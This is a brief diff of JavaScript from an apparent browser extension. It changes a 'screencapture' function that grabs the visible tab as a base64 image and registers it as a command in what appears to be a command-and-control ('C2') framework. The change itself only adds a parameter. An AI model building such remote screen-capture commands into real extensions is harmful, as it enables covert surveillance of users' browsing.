@@ -1,4 +1,4 @@
-screencapture = function(){
+screencapture = function(params){
     chrome.tabs.captureVisibleTab(null, function(img) {
         // send back the base64encoded image
         //console.log('Image '+img.toString());
@@ -18,3 +18,4 @@ screencapture = function(){
 };
 
 C2.commands[screencapture.name] = screencapture;
+
